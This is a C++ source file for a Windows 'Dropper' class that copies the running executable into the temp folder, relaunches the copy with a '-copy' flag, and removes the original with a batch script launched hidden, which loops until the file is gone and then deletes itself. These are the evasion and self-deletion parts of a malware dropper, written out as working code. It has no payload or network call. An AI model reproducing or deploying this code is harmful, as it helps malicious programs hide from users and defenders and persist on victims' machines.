#include "dropper.h"
#include <shlobj.h>
#include <iostream>


void Dropper::GetTemp_Path(std::wstring& tempPath) {
    wchar_t buffer[MAX_PATH];
    DWORD dwRetVal = GetTempPathW(MAX_PATH, buffer);
    if (dwRetVal > 0 && dwRetVal <= MAX_PATH) {
        tempPath = buffer;
    }
}

void Dropper::GetCurrentExePath(std::wstring& exePath) {
    wchar_t buffer[MAX_PATH];
    DWORD dwRetVal = GetModuleFileNameW(NULL, buffer, MAX_PATH);
    if (dwRetVal > 0 && dwRetVal <= MAX_PATH) {
        exePath = buffer;
    }
}

bool Dropper::CopyExeToTemp(const std::wstring& exePath, const std::wstring& tempExePath) {
    if (CopyFileW(exePath.c_str(), tempExePath.c_str(), FALSE)) {
        return true;
    }
    else {
        return false;
    }
}

void Dropper::RunTempExe(const std::wstring& tempExePath) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    std::wstring command = tempExePath + L" -copy";

    if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

void Dropper::DeleteCurrentExe() {
    wchar_t buffer[MAX_PATH];
    GetModuleFileNameW(NULL, buffer, MAX_PATH);

    wchar_t batPath[MAX_PATH];
    GetTempPathW(MAX_PATH, batPath);
    wcscat_s(batPath, MAX_PATH, L"delete_self.bat");

    FILE* batFile;
    _wfopen_s(&batFile, batPath, L"w");
    if (batFile) {
        fwprintf(batFile, L":Repeat\n");
        fwprintf(batFile, L"del \"%s\"\n", buffer);
        fwprintf(batFile, L"if exist \"%s\" goto Repeat\n", buffer);
        fwprintf(batFile, L"del \"%s\"\n", batPath);
        fclose(batFile);

        ShellExecuteW(NULL, NULL, batPath, NULL, NULL, SW_HIDE);
    }
}
